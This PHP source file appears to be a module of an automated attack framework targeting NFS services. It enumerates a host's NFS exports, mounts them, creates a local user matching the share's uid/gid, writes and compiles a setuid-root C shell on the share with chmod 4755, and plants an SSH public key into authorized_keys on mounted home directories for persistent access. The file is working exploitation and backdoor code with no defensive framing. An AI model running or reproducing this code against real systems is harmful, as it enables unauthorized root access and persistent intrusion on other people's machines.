<?php

  // 1025,2049
class service2nfs extends service2netbios {


    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
    }


public function service2nfs2check4mount($path){
        $query = "echo '$this->root_passwd' | sudo -S mount -t nfs -o vers=3 -o nolock $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 "; // -o nolock
        //$query = "echo '$this->root_passwd' | sudo -S mount -t nfs4 -o proto=tcp,port=$this->port $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 ";
        $check_mount = $this->req_ret_str($query);
        $this->article("CHECK MOUNT", $check_mount);
        if(stristr($check_mount,"access denied") !== false) return FALSE;
        else {$this->note("Yes Mounted");return TRUE;};
    }
    
    public function service2nfs4mount2home2authorized_keys($authorized_keys_filepath,$remote_home_user,$remote_username,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        
        $public_key_ssh_rsa_file = "$this->dir_tmp/$this->ip"."_rsa.pub";
        $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip"."_rsa.priv";
        
        $private_keys = $this->genPrivateKey($private_key_ssh_rsa_file,"");
        $public_keys = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
        $this->pause();
        
        if (empty($authorized_keys_filepath)){
            if (!is_dir("$local_home_user/.ssh")) $this->requette("echo '$this->root_passwd' | sudo -S sudo -u $local_username mkdir $local_home_user/.ssh");
            $query = "echo '$this->root_passwd' | sudo -S sudo -u $local_username chmod 777 -R $local_home_user/.ssh";
            $this->requette($query);
            $query = "cat $public_key_ssh_rsa_file > $local_home_user/.ssh/authorized_keys";
            $this->requette($query);
            $query = "ls -al $local_home_user/.ssh";
            $this->requette($query);
            $query = "ls -aln $local_home_user/.ssh";
            $this->requette($query);
            $this->pause();
            
            
            $query = "echo '$this->root_passwd' | sudo -S chown $local_username:$local_username  $local_home_user/.ssh/authorized_keys";
            $this->requette($query);
            $query = "ls -al $local_home_user/.ssh";
            $this->requette($query);
            $query = "ls -aln $local_home_user/.ssh";
            $this->requette($query);
            $this->pause();
            
            $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
            $authorized_keys_filepath = trim($this->req_ret_str($query));
        }
        if (!empty($authorized_keys_filepath)){
            
        $stream = FALSE;
        $query = "cat $authorized_keys_filepath";
        $authorized_keys_str = trim($this->req_ret_str($query));
        $remote_userpass = "";
        
        $result .= $this->key2run($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
        }
        return $result;
    }
    
    public function service2nfs4mount2home($remote_home_user,$remote_username,$local_username,$local_home_user){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        
        $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
        $remote_authorized_keys_file = trim($this->req_ret_str($query));
        $result .= $remote_authorized_keys_file;
        
        $this->pause();
        $result .= $this->service2nfs4mount2home2authorized_keys($remote_authorized_keys_file,$remote_home_user,$remote_username,$local_username,$local_home_user);
        return $result;
    }
    
    public function service2nfs4mount2start($mounted_dir){
        $this->ssTitre(__FUNCTION__);
        $result = "";
        $query = "df -h | grep '$mounted_dir' ";
        $this->req_ret_str($query);
        
        $query = "stat $mounted_dir ";
        $this->req_ret_str($query);
        
        $this->req_ret_str("ls -al $mounted_dir 2> /dev/null ");
        $this->note("to access a locally mounted share, your uid and gid need to match the ones of the shared directory on the server");
        $query = "ls -dln $mounted_dir ";
        $this->req_ret_str($query);
        $query = "ls -dl $mounted_dir ";
        $this->req_ret_str($query);
        
        $this->pause();
        
        $uid_gid = trim($this->req_ret_str("ls -dln $mounted_dir | cut -d' ' -f3,4 "));
        
        $uid_name = trim($this->req_ret_str("ls -dl $mounted_dir | awk '{printf $3}'"));
        $this->article("UID Name=",$uid_name);
        $uid = exec("echo '$uid_gid' | cut -d' ' -f1 ");
        $this->article("UID=",$uid);
        $gid =  exec("echo '$uid_gid'  | cut -d' ' -f2 ");
        $this->article("GID=",$gid);
        
        if (!preg_match("([a-z]{1,}+)", $uid_name)){
            $find_user = "test";
            
            //$query = "echo '$this->root_passwd' | sudo -S groupmod -g $gid $find_user ";
            $query = "echo '$this->root_passwd' | sudo -S groupadd $find_user --gid $gid";
            $this->req_ret_str($query);
            
            //$query = "echo '$this->root_passwd' | sudo -S usermod -u $uid $find_user";
            $query = "echo '$this->root_passwd' | sudo -S useradd $find_user --uid $uid --gid $gid";
            $this->req_ret_str($query);
            
            $query = "cat /etc/passwd | grep $find_user";
            $this->req_ret_str($query);
            
            $query = "cat /etc/group | grep $find_user";
            $this->req_ret_str($query);
            
            $query = "groups $find_user";
            $this->req_ret_str($query);
            $this->pause();
            
        }
        else {
            $this->article("Exists User UID ", "$uid_name:$uid");
            $query = "cat /etc/passwd | grep \":$uid:\"  | cut -d':' -f1";
            $find_user = $this->req_ret_str($query);
            $find_user;
            $this->pause();
            
        }
        
        //$find_user = "root";
        $find_user = trim($find_user);
        // pieger les bot de cette maniere afin qu'il cree le user puis se connecter
        $query = "ls -al $mounted_dir"; // sudo -u $find_user
        $this->req_ret_str($query);
        

        $query = "ls -anl $mounted_dir"; // sudo -u $find_user
        $this->req_ret_str($query);
        $this->pause();
        
        $suid = <<<EOC
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(){
setuid(0);
setgid(0);
system("/bin/bash");
return 0;
}
EOC;
        $data = "echo '$suid' > $mounted_dir/bash.c ";
        $this->req_ret_str($data);
        $this->pause();
        
        $data = "gcc -o $mounted_dir/bash $mounted_dir/bash.c ";
        $this->req_ret_str($data);
        $this->pause();
        
        
        $data = "chmod 4755 $mounted_dir/bash ";
        $this->req_ret_str($data);
        
        $data = "ls -al $mounted_dir/bash";
        $this->req_ret_str($data);
        $this->pause();
        
        
        return $uid_name;
    }
    
    
    
    
    public function service2nfs4mount($path_user){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        $local_home_user = "/tmp/$this->ip.$this->port.nfs";
        if (!is_dir($local_home_user)) $this->requette("mkdir $local_home_user");
        
        
         if($this->service2nfs2check4mount($path_user))  {
             $uid_name = $this->service2nfs4mount2start($local_home_user);
             
             $this->key4add($this->stream8service,$local_home_user);
             $this->pause();
       }
       $this->pause();
       
       
       
       
       /*
       switch ($path_user) {
           case (strstr($path_user,"/root/")) :
               $root = TRUE;
               break ;
               
           case (strstr($path_user,"/home/")) :
               $find_user = trim($this->req_ret_str("echo '$path_user' | sed 's/\/home\///g' "));
               if (!empty($find_user)) {
                   $this->yesUSERS($this->port2id, $find_user, "Enum via ".__FUNCTION__.": $path_user", "NFS PATH");
                   $this->service2nfs4mount2home($path_user,$find_user, $uid_name, $local_home_user);
               }
               break;
       }
*/
        
       $query = "echo '$this->root_passwd' | sudo -S umount $local_home_user";
       $this->requette($query);
        return $result;
    }
    
    
public function service2nfs4exec() {
        $result = "";
            $this->titre(__FUNCTION__);

            $query = "rpcinfo -p  $this->ip | grep nfs ";
            
            $this->req_ret_str($query);
            $query = "showmount --exports $this->ip 2>&1  | grep '/' ";
            $check = $this->req_ret_str($query);
            $path_user = "";
            
            if (!empty($check)) {
  //echo $this->rouge("1");
  $path_users = explode("\n", $check);
  foreach ($path_users as $path) 
      if (!empty($path)) {
          $path_user = trim($this->req_ret_str("echo \"$path\" | cut -d' ' -f1 | cut -d\"*\" -f1 ")) ;
     $this->article("Path Mounted", $path_user) ;
     $this->pause();
     if(!empty($path_user)) $this->service2nfs4mount($path_user);
  }
            }
            
            return $result;
        
    }
    



  }
?>
